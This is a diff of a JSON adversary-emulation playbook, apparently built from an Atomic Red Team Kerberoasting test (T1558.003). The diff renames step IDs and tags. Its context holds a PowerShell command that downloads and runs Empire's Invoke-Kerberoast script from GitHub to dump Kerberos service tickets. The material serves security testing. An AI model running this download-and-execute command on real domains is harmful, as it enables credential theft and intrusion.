@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "76669aa7-e7bd-41f6-91e3-590bea6c5a5b",
+      "id": "d0e590da-6c47-45bc-a753-77c12a1597d8",
       "type": "execute-command",
       "data": {
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)\nInvoke-Kerberoast | fl\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "a170a40a-cd41-4f69-92da-441e6150bb6b",
+      "id": "857d1f6b-bab6-44fe-9233-48abb0f82945",
       "name": "Check dependency 1/1",
       "description": "Computer must be domain joined\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": false
     },
     {
-      "id": "4e625299-7d4c-42fb-a14d-da1a225ac075",
+      "id": "0d26d364-498d-4d0a-9b97-eb5308ff8af9",
       "name": "Resolve dependency 1/1",
       "description": "Computer must be domain joined\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": false
     },
     {
-      "id": "47567aa5-f2b8-40be-aea8-d7c2aad688e1",
+      "id": "25e0f7c9-1894-491d-bba6-64a7979cb531",
       "name": "Re-check dependency 1/1",
       "description": "Computer must be domain joined\n",
       "type": "execute-command",
@@ -51,28 +51,28 @@
   ],
   "flows": [
     {
-      "s": "a170a40a-cd41-4f69-92da-441e6150bb6b",
+      "s": "857d1f6b-bab6-44fe-9233-48abb0f82945",
       "p": "on-success",
-      "o": "76669aa7-e7bd-41f6-91e3-590bea6c5a5b"
+      "o": "d0e590da-6c47-45bc-a753-77c12a1597d8"
     },
     {
-      "s": "a170a40a-cd41-4f69-92da-441e6150bb6b",
+      "s": "857d1f6b-bab6-44fe-9233-48abb0f82945",
       "p": "on-failure",
-      "o": "4e625299-7d4c-42fb-a14d-da1a225ac075"
+      "o": "0d26d364-498d-4d0a-9b97-eb5308ff8af9"
     },
     {
-      "s": "4e625299-7d4c-42fb-a14d-da1a225ac075",
+      "s": "0d26d364-498d-4d0a-9b97-eb5308ff8af9",
       "p": "on-success",
-      "o": "47567aa5-f2b8-40be-aea8-d7c2aad688e1"
+      "o": "25e0f7c9-1894-491d-bba6-64a7979cb531"
     },
     {
-      "s": "47567aa5-f2b8-40be-aea8-d7c2aad688e1",
+      "s": "25e0f7c9-1894-491d-bba6-64a7979cb531",
       "p": "on-failure",
-      "o": "76669aa7-e7bd-41f6-91e3-590bea6c5a5b"
+      "o": "d0e590da-6c47-45bc-a753-77c12a1597d8"
     }
   ],
   "tags": [
-    "T1558.003",
-    "atomic-red-team"
+    "T1558",
+    "T1558.003"
   ]
 }
